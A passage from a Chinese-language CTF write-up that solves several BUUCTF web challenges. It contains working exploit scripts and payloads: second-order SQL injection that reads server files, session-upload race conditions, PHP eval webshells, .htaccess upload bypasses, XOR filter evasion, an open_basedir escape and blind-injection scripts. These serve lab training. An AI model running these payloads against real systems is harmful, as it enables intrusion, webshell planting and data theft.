class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>二次注入，先写留言存进去，然后留言的时候闭合上前面的注释符即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">留言均为*/#即可</span><br><span class="line">查看user </span><br><span class="line">title=user2&amp;category=evo1&#x27;,content=user(),/*&amp;content=c</span><br></pre></td></tr></table></figure><p>发现是<code>root@localhost</code>，权限很高，估计<code>flag</code>不在数据库里，读一下<code>/etc/passwd</code>，发现有<code>www</code>用户，去读一下其配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=www&amp;category=evo1&#x27;,content=(select (load_file(&quot;/home/www/.bash_history&quot;))),/*&amp;content=c</span><br><span class="line"></span><br><span class="line">cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start</span><br></pre></td></tr></table></figure><p>看到有个<code>html.zip</code>里有个<code>.DS_Store</code>被解压复制后又删除了，但应该在<code>tmp</code>里还有，去读一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=www&amp;category=evo1&#x27;,content=(select (load_file(&quot;/tmp/html/.DS_Store&quot;))),/*&amp;content=c</span><br><span class="line">读不全，用十六进制</span><br><span class="line">title=ds_store&amp;category=evo1&#x27;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/*&amp;content=c</span><br></pre></td></tr></table></figure><p>解码后发现<code>flag_8946e1ff1ee3e40f.php</code>，直接读取然后解码即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=flag&amp;category=evo1&#x27;,content=(select hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;))),/*&amp;content=c</span><br></pre></td></tr></table></figure><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p>查看源码发现</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--md5($secret.$name)===$pass --&gt;</span></span><br></pre></td></tr></table></figure><p>先发送空<code>user</code>看一下<code>secret</code>的<code>md5</code>值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&amp;pass=</span><br></pre></td></tr></table></figure><p>发现<code>Set-Cookie: Hash=fa25e54758d5d5c1927781a6ede89f8a;</code>，直接把这个哈希值放到<code>pass</code>即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&amp;pass=fa25e54758d5d5c1927781a6ede89f8a</span><br></pre></td></tr></table></figure><p>发现<code>window.location.href=&quot;flflflflag.php&quot;;</code>，抓包访问可以看到</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">           <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;404.html&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">include($_GET[&quot;file&quot;])<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>各个文件都读一下，都没啥用，用<code>/flflflflag.php?file=php://filter/convert.base64-encode/resource=flflflflag.php</code>读一下<code>flflflflag.php</code>的源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h3><p>直接条件竞争</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">session=requests.session()</span><br><span class="line">sess=<span class="string">&#x27;evo1&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;http://987fa2c2-bccf-4ed3-983b-0a41f044d15d.node4.buuoj.cn:81/flflflflag.php&quot;</span></span><br><span class="line">url2=<span class="string">&#x27;http://987fa2c2-bccf-4ed3-983b-0a41f044d15d.node4.buuoj.cn:81/flflflflag.php?file=/tmp/sess_&#x27;</span> + sess</span><br><span class="line">data1=&#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data2=&#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;a.txt&#x27;</span>, io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>))&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url2,data=data2)</span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p>然后<code>1.php</code>下查看<code>phpinfo</code>即可</p><h3 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h3><p>爆破一下路径会得到一个<code>dir.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/tmp&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个文件可以打印出<code>/tmp</code>目录下的文件名，可以利用<a href="https://blog.csdn.net/weixin_45646006/article/details/120817553">CVE-2018-14884</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://acd4af22-f5d2-4e83-98e7-3d3f4003b0ff.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">file = &#123;<span class="string">&#x27;file&#x27;</span>: io.BytesIO(payload.encode())&#125;</span><br><span class="line">url += <span class="string">&quot;flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">r=requests.post(url=url,files=file)</span><br></pre></td></tr></table></figure><p>查看文件名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flflflflag.php?file=dir.php</span><br></pre></td></tr></table></figure><p>包含对应文件即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flflflflag.php?file=/tmp/phpK70enE</span><br><span class="line">POST:</span><br><span class="line">1=phpinfo();</span><br></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p><code>json_decode</code>会将<code>\uxxx</code>进行转义，所以利用<code>unicode</code>绕过即可</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;page&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0072\u0065\u0061\u0064\u003d\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==False) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = <span class="title function_ invoke__">count_chars</span>(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先<code>fuzz</code>一下可用字符，发现需要用异或来绕过，抄一下网上的脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">valid</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$s</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$s</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>) &lt;= <span class="number">127</span>)  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$result0</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$result1</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$c</span>=<span class="number">0</span>; <span class="variable">$c</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$c</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">256</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="comment">// echo &quot;round $i\n&quot;;</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)^<span class="variable">$s</span>[<span class="variable">$c</span>]))&#123;</span><br><span class="line">                    <span class="comment">// echo $i;</span></span><br><span class="line">                    <span class="variable">$result0</span>.=<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>));</span><br><span class="line">                    <span class="variable">$result1</span>.=<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)^<span class="variable">$s</span>[<span class="variable">$c</span>]);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result0</span>.<span class="string">&#x27;^&#x27;</span>.<span class="variable">$result1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">get</span>(<span class="string">&#x27;_GET&#x27;</span>); <span class="comment">//%80%80%80%80^%DF%C7%C5%D4</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>现在就可以查看<code>phpinfo</code>了，发现有<code>disable_functions</code>和<code>open_basedir</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?_=$&#123;%80%80%80%80^%DF%C7%C5%D4&#125;&#123;%80&#125;();&amp;%80=phpinfo</span><br></pre></td></tr></table></figure><p>接下来需要调用<code>get_the_flag</code>函数来进行文件上传，需要绕过三个点</p><ul><li>后缀不能有<code>ph</code></li><li>文件内容不能有<code>&lt;?</code></li><li>文件的头需要是图像的头</li></ul><p>可以通过上传<code>.htaccess</code>来绕过，因为在<code>.htaccess</code>在头部定义图片大小可以绕过<code>exif_imagetype</code>函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define width 1000</span><br><span class="line">#define height 1000</span><br></pre></td></tr></table></figure><p>拿网上的脚本改一下（md5值改成自己的）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4a42b678-0e23-4821-bfca-2cdb56259bd9.node4.buuoj.cn:81/?_=$&#123;%80%80%80%80^%DF%C7%C5%D4&#125;&#123;%80&#125;();&amp;%80=get_the_flag&quot;</span></span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b&quot;&quot;&quot;#define width 1000</span></span><br><span class="line"><span class="string">#define height 1000 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .evo1</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_c55e0cb61f7eb238df09ae30a206e5ee/shell.evo1&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shell = <span class="string">b&quot;GIF89a12&quot;</span> + base64.b64encode(<span class="string">b&quot;&lt;?php eval($_REQUEST[&#x27;evo1&#x27;]);?&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">&quot;upload&quot;</span>:<span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.evo1&#x27;</span>,shell,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>用网上的通用函数组合绕一下<code>open_basedir</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/tmp_c55e0cb61f7eb238df09ae30a206e5ee/shell.evo1?evo1=chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);var_dump(scandir(&#x27;/&#x27;));print_r(file_get_contents(&#x27;/THis_Is_tHe_F14g&#x27;));</span><br></pre></td></tr></table></figure><h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p>乱测一下发现报错</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/secret?secret=app.py</span><br></pre></td></tr></table></figure><p>拿到关键代码，并且可以发现是<code>python2.7</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">   rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line">   deS=rc.do_crypt(secret)</span><br><span class="line"></span><br><span class="line">   a=render_template_string(safe(deS))</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line">   <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure><p>一个密钥为<code>HereIsTreasure</code>的<code>RC4</code>解密，用<code>Cyberchef</code>的<code>RC4</code>和<code>url编码</code>烹饪下就行。但是不知道过滤了什么，先<code>ls</code>下试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;read&#x27; is not allowed. Secret is app.py rc4_Modified.py rc4_Modified.pyc requirements.txt</span><br><span class="line">/secret?secret=%2E%14%11%1D%C3%A2%0B%02%7Ex%C2%88%C3%95%28%C3%B9%C2%8D%C3%89%C2%AF8%C2%9CV5%C2%BBA%C3%9FMM%C2%ACq%C3%87m%C3%B30%C3%B2%24%C2%87Y%C3%9F%06%C3%A2%17%C3%9B5%C3%9F%C2%9B%C3%A3aG%C3%B4R%C3%A2%C2%82yeo%C3%BB%25%7E%C2%83%00w%C2%8C%C2%85%0D%1E%C3%A6%C2%A8%5E%C3%B3%07%2AK%27%C3%ACA%C2%93%05%C2%A7p%C2%80T%1EwxW%C2%8A%C3%97%5F%C3%B0%C3%BF%C3%A1%C2%8E%C3%B3%C2%9C</span><br></pre></td></tr></table></figure><p>可以执行，但读不了<code>app.py</code>，去看根目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;read&#x27; is not allowed. Secret is app bin dev etc flag.txt home lib media mnt opt proc root run sbin srv sys tmp usr var</span><br><span class="line">/secret?secret=%2E%14%11%1D%C3%A2%0B%02%7Ex%C2%88%C3%95%28%C3%B9%C2%8D%C3%89%C2%AF8%C2%9CV5%C2%BBA%C3%9FMM%C2%ACq%C3%87m%C3%B30%C3%B2%24%C2%87Y%C3%9F%06%C3%A2%17%C3%9B5%C3%9F%C2%9B%C3%A3aG%C3%B4R%C3%A2%C2%82yeo%C3%BB%25%7E%C2%83%00w%C2%8C%C2%85%0D%1E%C3%A6%C2%A8%5E%C3%B3%07%2AK%27%C3%ACA%C2%93%05%C2%A7p%C2%80%28%16%02q%0C%C3%81%C3%84%5E%C2%B9%C2%B2%C3%AE%C2%8E%C2%A9%C3%88%C3%BB%3D</span><br></pre></td></tr></table></figure><p>用<code>popen</code>读不了，拼接一下就行，也可以直接弹shell或者读文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/secret?secret=%2E%14%11%1D%C3%A2%0B%02%7Ex%C2%88%C3%95%28%C3%B9%C2%8D%C3%89%C2%AF8%C2%9CV5%C2%BBA%C3%9FMM%C2%ACq%C3%87m%C3%B30%C3%B2%24%C2%87Y%C3%9F%06%C3%A2%17%C3%9B5%C3%9F%C2%9B%C3%A3aG%C3%B4R%C3%AD%C3%BAy%2B%29%C2%AC%15%2B%C3%9CxA%C2%83%C3%B2%0D%1C%C2%B2%C3%9F%5E%C2%AA%0Eq%038%C2%AE%04%C2%9C%2B%C2%A77%C3%94%7C%1Euqz%C3%88%C2%9D%1C%C2%87%C3%B1%C3%AD%C2%80%C2%A6%C3%86%C2%ADgt%C3%9F%C3%80%C3%B9%C3%B0%C3%A0%3D%0D%C2%A0%C2%97%12%C3%8Feh%5D%C2%92%C3%8E%0D%7Eb%07%22%C2%92%C2%AF%C3%90eo%C3%ABhD%1A%C2%96%2B%C3%97%19%C3%85%C3%93%C2%B8%2E%C2%B9%C3%A8%12g%C2%AD%C2%94h%C3%8B%2B%06%14%05%C2%9D%C3%88%C3%AD%C3%AF%C3%BA%C3%8Fu%100%29%06%C2%92%0F%C3%8Aw%5F%C3%A4%C2%97B%3D%3F%C3%A6%C2%B0%29%C2%B6%C2%80%C3%B3LO%C3%9BN%2D1%C2%B3%C3%B2%1B%C2%82%C3%B0%C3%8Aa%C2%A9%C3%A2%C2%98n%C3%83%27%0D%C3%BE%C2%AB%C3%9B%C2%98P%3B%C2%89%C3%A5%C3%A8%23%C3%A3b%C3%88%C3%B4%2A%5D%2C%3D%C2%85%2D%C3%83%C2%AEs%C3%8B%C3%AAlYy%60F%2F%C2%99%C3%A8%C3%A7%C2%9C%C3%87%C3%A7%C3%BFSC%07%C2%81%C3%90%C3%9A%C3%98%C2%BC%3B%2C</span><br></pre></td></tr></table></figure><h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>存在注册页面（register.php），二次注入+盲注，注入点在用户名处，并且过滤了<code>,</code>和<code>information</code>，只能猜在<code>flag</code>字段，写个脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://dbdbeee9-53f2-4481-a4eb-bf80420ab983.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">sess = requests.session()</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&quot;email&quot;</span>: <span class="string">&quot;&#123;&#125;@qq.com&quot;</span>.<span class="built_in">format</span>(i),</span><br><span class="line"><span class="string">&quot;username&quot;</span>: <span class="string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0&quot;</span>.<span class="built_in">format</span>(i),</span><br><span class="line"><span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">sess.post(url=url+<span class="string">&#x27;register.php&#x27;</span>,data=data)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&quot;email&quot;</span>: <span class="string">&quot;&#123;&#125;@qq.com&quot;</span>.<span class="built_in">format</span>(i),</span><br><span class="line"><span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">sess.post(url=url+<span class="string">&#x27;login.php&#x27;</span>,data=data)</span><br><span class="line"></span><br><span class="line">response = sess.get(url=url+<span class="string">&#x27;index.php&#x27;</span>)</span><br><span class="line">res = re.findall(<span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span>,response.text)</span><br><span class="line">flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(res[<span class="number">0</span>]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"><span 